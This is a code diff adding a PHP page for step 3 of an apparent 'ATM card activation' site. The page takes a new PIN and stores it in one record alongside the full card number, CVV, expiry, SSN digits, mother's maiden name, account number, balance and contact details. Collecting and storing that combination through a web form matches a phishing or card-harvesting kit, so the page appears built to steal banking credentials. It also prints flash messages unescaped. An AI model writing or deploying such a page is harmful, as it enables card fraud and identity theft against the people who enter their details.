@@ -1,0 +1,252 @@
+<?php
+/**
+ * ATM Card Activation - Step 3: PIN Setup & Completion
+ */
+
+require_once 'includes/config.php';
+require_once 'includes/functions.php';
+require_once 'includes/db.php';
+
+// Check if previous steps data exists
+if (!isset($_SESSION['activation_data']) || 
+    !isset($_SESSION['activation_data']['card_number'])) {
+    set_flash('error', 'Please complete all previous steps first.');
+    redirect('index.php');
+}
+
+// Generate CSRF token
+$csrf_token = generate_csrf_token();
+
+// Handle form submission
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Verify CSRF token
+    if (!isset($_POST['csrf_token']) || !verify_csrf_token($_POST['csrf_token'])) {
+        set_flash('error', 'Invalid security token. Please try again.');
+        redirect('pin-setup.php');
+    }
+    
+    // Validate PIN
+    $pin = sanitize_input($_POST['pin'] ?? '');
+    $pinConfirm = sanitize_input($_POST['pin_confirm'] ?? '');
+    
+    $errors = [];
+    
+    if (empty($pin) || strlen($pin) !== 4 || !ctype_digit($pin)) {
+        $errors[] = 'PIN must be exactly 4 digits.';
+    }
+    
+    if ($pin !== $pinConfirm) {
+        $errors[] = 'PIN and confirmation do not match.';
+    }
+    
+    if (empty($errors)) {
+        try {
+            $db = getDB();
+            $db->beginTransaction();
+            
+            $data = $_SESSION['activation_data'];
+            
+            // Hash PIN
+            $pinHash = hash_password($pin);
+            
+            // Encrypt sensitive data
+            $ssnEncrypted = encrypt_data($data['ssn_last4']);
+            $cardNumberEncrypted = encrypt_data($data['card_number']);
+            $cvvEncrypted = encrypt_data($data['cvv']);
+            
+            // Get client info
+            $ipAddress = get_client_ip();
+            $userAgent = get_user_agent();
+            
+            // Insert activation record
+            $sql = "INSERT INTO activations (
+                first_name, last_name, dob, email, phone, account_number,
+                street, city, state, zip, ssn_last4, maiden_name,
+                card_number, expiry_date, cvv, pin_hash, balance,
+                status, ip_address, user_agent
+            ) VALUES (
+                ?, ?, ?, ?, ?, ?,
+                ?, ?, ?, ?, ?, ?,
+                ?, ?, ?, ?, ?,
+                'active', ?, ?
+            )";
+            
+            $params = [
+                $data['first_name'],
+                $data['last_name'],
+                $data['dob'],
+                $data['email'],
+                $data['phone'],
+                $data['account_number'],
+                $data['street'],
+                $data['city'],
+                $data['state'],
+                $data['zip'],
+                $ssnEncrypted,
+                $data['maiden_name'],
+                $cardNumberEncrypted,
+                $data['expiry_date'],
+                $cvvEncrypted,
+                $pinHash,
+                $data['balance'],
+                $ipAddress,
+                $userAgent
+            ];
+            
+            $db->execute($sql, $params);
+            $activationId = $db->lastInsertId();
+            
+            $db->commit();
+            
+            // Clear session data
+            unset($_SESSION['activation_data']);
+            
+            // Set success session variable
+            $_SESSION['activation_success'] = [
+                'id' => $activationId,
+                'name' => $data['first_name'] . ' ' . $data['last_name'],
+                'card_last4' => substr($data['card_number'], -4),
+                'email' => $data['email']
+            ];
+            
+            redirect('success.php');
+            
+        } catch (Exception $e) {
+            $db->rollback();
+            log_error('Activation error: ' . $e->getMessage());
+            set_flash('error', 'An error occurred during activation. Please try again.');
+        }
+    } else {
+        set_flash('error', implode('<br>', $errors));
+    }
+}
+
+// Get flash message
+$flash = get_flash();
+$activationData = $_SESSION['activation_data'];
+?>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Card Activation - Step 3 | <?php echo APP_NAME; ?></title>
+    <link rel="stylesheet" href="css/styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>ATM Card Activation</h1>
+            <p>Secure online activation in 3 easy steps</p>
+        </div>
+        
+        <!-- Progress Indicator -->
+        <div class="progress-indicator">
+            <div class="progress-step completed">
+                <span class="step-number">✓</span>
+                <span class="step-label">Personal Info</span>
+            </div>
+            <div class="progress-step completed">
+                <span class="step-number">✓</span>
+                <span class="step-label">Card Details</span>
+            </div>
+            <div class="progress-step active">
+                <span class="step-number">3</span>
+                <span class="step-label">PIN Setup</span>
+            </div>
+        </div>
+        
+        <?php if ($flash): ?>
+        <div class="alert alert-<?php echo $flash['type']; ?>">
+            <?php echo $flash['message']; ?>
+        </div>
+        <?php endif; ?>
+        
+        <div style="text-align: center; margin-bottom: 30px;">
+            <h3 style="color: var(--primary-color); margin-bottom: 10px;">Set Your 4-Digit PIN</h3>
+            <p style="color: var(--text-muted); font-size: 14px;">
+                Choose a secure PIN that you'll use to access your account
+            </p>
+        </div>
+        
+        <form id="pinForm" method="POST" action="pin-setup.php">
+            <input type="hidden" name="csrf_token" value="<?php echo $csrf_token; ?>">
+            
+            <div class="form-group">
+                <label for="pin">Enter PIN <span class="required">*</span></label>
+                <input type="password" id="pin" name="pin" class="form-control" 
+                       autocomplete="new-password" required maxlength="4"
+                       placeholder="4-digit PIN"
+                       pattern="[0-9]{4}"
+                       inputmode="numeric">
+                <span class="info-text">Choose a 4-digit PIN (numbers only)</span>
+                <span class="error-message">PIN must be exactly 4 digits</span>
+            </div>
+            
+            <div class="form-group">
+                <label for="pin_confirm">Confirm PIN <span class="required">*</span></label>
+                <input type="password" id="pin_confirm" name="pin_confirm" class="form-control" 
+                       autocomplete="new-password" required maxlength="4"
+                       placeholder="Re-enter PIN"
+                       pattern="[0-9]{4}"
+                       inputmode="numeric">
+                <span class="error-message">PINs must match</span>
+            </div>
+            
+            <!-- PIN Display Preview -->
+            <div class="pin-display" id="pinDisplay" style="display: none;">
+                <div class="pin-digit" id="digit1"></div>
+                <div class="pin-digit" id="digit2"></div>
+                <div class="pin-digit" id="digit3"></div>
+                <div class="pin-digit" id="digit4"></div>
+            </div>
+            
+            <div style="background: #f8f9fa; padding: 20px; border-radius: 8px; margin: 20px 0;">
+                <h4 style="color: var(--dark-color); margin-bottom: 15px; font-size: 16px;">
+                    Activation Summary
+                </h4>
+                <div style="display: grid; gap: 10px; font-size: 14px;">
+                    <div style="display: flex; justify-content: space-between;">
+                        <span style="color: var(--text-muted);">Name:</span>
+                        <span style="font-weight: 600;">
+                            <?php echo htmlspecialchars($activationData['first_name'] . ' ' . $activationData['last_name']); ?>
+                        </span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between;">
+                        <span style="color: var(--text-muted);">Account:</span>
+                        <span style="font-weight: 600;">
+                            <?php echo htmlspecialchars($activationData['account_number']); ?>
+                        </span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between;">
+                        <span style="color: var(--text-muted);">Card Number:</span>
+                        <span style="font-weight: 600;">
+                            <?php echo mask_card_number($activationData['card_number']); ?>
+                        </span>
+                    </div>
+                    <div style="display: flex; justify-content: space-between;">
+                        <span style="color: var(--text-muted);">Email:</span>
+                        <span style="font-weight: 600;">
+                            <?php echo htmlspecialchars($activationData['email']); ?>
+                        </span>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="button-group">
+                <a href="card-display.php" class="btn btn-secondary">← Back</a>
+                <button type="submit" class="btn btn-success">
+                    Complete Activation
+                </button>
+            </div>
+        </form>
+    </div>
+    
+    <!-- Loading Spinner -->
+    <div class="loading-spinner" id="loadingSpinner">
+        <div class="spinner"></div>
+    </div>
+    
+    <script src="js/pin-setup.js"></script>
+</body>
+</html>
